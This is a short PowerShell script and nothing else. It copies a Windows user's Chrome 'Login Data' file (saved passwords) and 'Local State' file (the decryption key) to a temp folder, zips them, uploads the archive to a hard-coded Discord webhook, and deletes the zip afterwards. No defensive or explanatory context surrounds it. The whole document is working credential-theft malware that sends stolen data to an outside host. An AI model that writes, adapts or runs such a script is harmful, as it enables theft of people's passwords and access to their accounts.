$hookurl="https://discord.com/api/webhooks/1213792320122523688/lIBOlPzfAcQVLmZIkYbvuxwJeviZWCQIz-CcF4Ep4ENGwwg3BmZgu0x0N68OOR_tZ4Vy"
function Send-Discord {
    [CmdletBinding()]
    param(
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text
    )

    $Body = @{
        'username' = $env:username
        'content'  = $text
    }

    if (-not([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

$FolderName = "$env:USERNAME-PASSWORDS-$(get-date -f yyyy-MM-dd_hh-mm)"
$ZIP = "$FolderName.zip"
New-Item -Path $env:tmp/$FolderName -ItemType Directory

Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination  $env:TEMP\$FolderName\output.txt
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination  $env:TEMP\$FolderName\key.txt

Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP

Send-Discord -file $env:tmp/$ZIP
Remove-Item $env:tmp/$ZIP